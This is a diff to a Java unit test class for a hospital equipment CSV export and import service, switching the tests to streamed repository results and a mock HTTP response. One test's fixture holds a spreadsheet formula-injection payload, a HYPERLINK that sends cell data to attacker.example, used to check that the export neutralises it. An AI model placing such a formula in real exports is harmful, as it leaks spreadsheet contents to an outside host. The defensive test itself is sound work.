@@ -75,8 +75,18 @@ class EquipmentCsvServiceTest {
         lenient().when(hospitalRepository.findByUserId(1L)).thenReturn(Optional.of(hospital));
     }
 
+    private byte[] exportAsBytes() {
+        org.springframework.mock.web.MockHttpServletResponse response = new org.springframework.mock.web.MockHttpServletResponse();
+        try {
+            equipmentService.exportEquipmentCsv(USERNAME, response);
+            return response.getContentAsByteArray();
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }
+    }
+
     private String exportAsText() {
-        String csv = new String(equipmentService.exportEquipmentCsv(USERNAME), StandardCharsets.UTF_8);
+        String csv = new String(exportAsBytes(), StandardCharsets.UTF_8);
         return csv.startsWith(CsvSupport.UTF8_BOM) ? csv.substring(CsvSupport.UTF8_BOM.length()) : csv;
     }
 
@@ -91,7 +101,7 @@ class EquipmentCsvServiceTest {
     @Test
     @DisplayName("a comma in an asset name no longer shifts every later column")
     void commaInNameDoesNotShiftColumns() {
-        when(equipmentRepository.findByHospitalId(HOSPITAL_ID)).thenReturn(List.of(
+        when(equipmentRepository.findStreamByHospitalId(HOSPITAL_ID)).thenReturn(java.util.stream.Stream.of(
                 Equipment.builder()
                         .equipmentCode("EQ-1002")
                         .name("Ventilator, Portable")
@@ -117,7 +127,7 @@ class EquipmentCsvServiceTest {
     @Test
     @DisplayName("a null warranty date exports as an empty field, not the text 'null'")
     void nullDateExportsEmpty() {
-        when(equipmentRepository.findByHospitalId(HOSPITAL_ID)).thenReturn(List.of(
+        when(equipmentRepository.findStreamByHospitalId(HOSPITAL_ID)).thenReturn(java.util.stream.Stream.of(
                 Equipment.builder()
                         .equipmentCode("EQ-1")
                         .name("Analyser")
@@ -137,7 +147,7 @@ class EquipmentCsvServiceTest {
     @Test
     @DisplayName("a formula in an asset name is neutralised in the export")
     void formulaIsNeutralised() {
-        when(equipmentRepository.findByHospitalId(HOSPITAL_ID)).thenReturn(List.of(
+        when(equipmentRepository.findStreamByHospitalId(HOSPITAL_ID)).thenReturn(java.util.stream.Stream.of(
                 Equipment.builder()
                         .equipmentCode("EQ-1")
                         .name("=HYPERLINK(\"https://attacker.example/?d=\"&A1,\"Click\")")
@@ -154,9 +164,9 @@ class EquipmentCsvServiceTest {
     @Test
     @DisplayName("the export is CRLF-terminated and BOM-prefixed")
     void exportFormatting() {
-        when(equipmentRepository.findByHospitalId(HOSPITAL_ID)).thenReturn(List.of());
+        when(equipmentRepository.findStreamByHospitalId(HOSPITAL_ID)).thenReturn(java.util.stream.Stream.empty());
 
-        String csv = new String(equipmentService.exportEquipmentCsv(USERNAME), StandardCharsets.UTF_8);
+        String csv = new String(exportAsBytes(), StandardCharsets.UTF_8);
 
         assertTrue(csv.startsWith(CsvSupport.UTF8_BOM), "Excel needs the BOM to read UTF-8");
         assertTrue(csv.endsWith("\r\n"), "RFC 4180 mandates CRLF between records");
@@ -169,7 +179,7 @@ class EquipmentCsvServiceTest {
     @Test
     @DisplayName("a file exported by this application can be re-imported")
     void exportedFileIsReimportable() {
-        when(equipmentRepository.findByHospitalId(HOSPITAL_ID)).thenReturn(List.of(
+        when(equipmentRepository.findStreamByHospitalId(HOSPITAL_ID)).thenReturn(java.util.stream.Stream.of(
                 Equipment.builder()
                         .equipmentCode("EQ-1")
                         .name("Ventilator, Portable")
@@ -182,7 +192,7 @@ class EquipmentCsvServiceTest {
                         .hospital(hospital)
                         .build()));
 
-        byte[] exported = equipmentService.exportEquipmentCsv(USERNAME);
+        byte[] exported = exportAsBytes();
 
         EquipmentImportSummary summary = equipmentService.importEquipmentFromCsv(
                 new MockMultipartFile("file", "equipment.csv", "text/csv", exported), USERNAME);
@@ -246,7 +256,7 @@ class EquipmentCsvServiceTest {
         // Both columns are written by the export and were never read back on import, so a round trip
         // minted a fresh equipment code and dropped the warranty date entirely - the two columns were
         // write-only, which made re-importing an export create duplicates rather than update.
-        when(equipmentRepository.findByHospitalId(HOSPITAL_ID)).thenReturn(List.of(
+        when(equipmentRepository.findStreamByHospitalId(HOSPITAL_ID)).thenReturn(java.util.stream.Stream.of(
                 Equipment.builder()
                         .equipmentCode("EQ-1001")
                         .name("MRI Scanner")
@@ -258,7 +268,7 @@ class EquipmentCsvServiceTest {
                         .hospital(hospital)
                         .build()));
 
-        byte[] exported = equipmentService.exportEquipmentCsv(USERNAME);
+        byte[] exported = exportAsBytes();
 
         equipmentService.importEquipmentFromCsv(
                 new MockMultipartFile("file", "equipment.csv", "text/csv", exported), USERNAME);
@@ -276,7 +286,7 @@ class EquipmentCsvServiceTest {
     @Test
     @DisplayName("an embedded newline survives the round trip")
     void embeddedNewlineSurvivesRoundTrip() {
-        when(equipmentRepository.findByHospitalId(HOSPITAL_ID)).thenReturn(List.of(
+        when(equipmentRepository.findStreamByHospitalId(HOSPITAL_ID)).thenReturn(java.util.stream.Stream.of(
                 Equipment.builder()
                         .equipmentCode("EQ-2")
                         .name("Ventilator\nSecond line")
@@ -286,7 +296,7 @@ class EquipmentCsvServiceTest {
                         .hospital(hospital)
                         .build()));
 
-        byte[] exported = equipmentService.exportEquipmentCsv(USERNAME);
+        byte[] exported = exportAsBytes();
 
         EquipmentImportSummary summary = equipmentService.importEquipmentFromCsv(
                 new MockMultipartFile("file", "equipment.csv", "text/csv", exported), USERNAME);
@@ -305,7 +315,7 @@ class EquipmentCsvServiceTest {
         // The import used InputStreamReader with no charset, so it decoded with the platform default.
         // On a JVM defaulting to Windows-1252 the BOM decoded to three stray characters and every
         // non-ASCII name was mangled.
-        when(equipmentRepository.findByHospitalId(HOSPITAL_ID)).thenReturn(List.of(
+        when(equipmentRepository.findStreamByHospitalId(HOSPITAL_ID)).thenReturn(java.util.stream.Stream.of(
                 Equipment.builder()
                         .equipmentCode("EQ-3")
                         .name("Röntgengerät \u00b5-Scan")
@@ -315,7 +325,7 @@ class EquipmentCsvServiceTest {
                         .hospital(hospital)
                         .build()));
 
-        byte[] exported = equipmentService.exportEquipmentCsv(USERNAME);
+        byte[] exported = exportAsBytes();
 
         equipmentService.importEquipmentFromCsv(
                 new MockMultipartFile("file", "equipment.csv", "text/csv", exported), USERNAME);
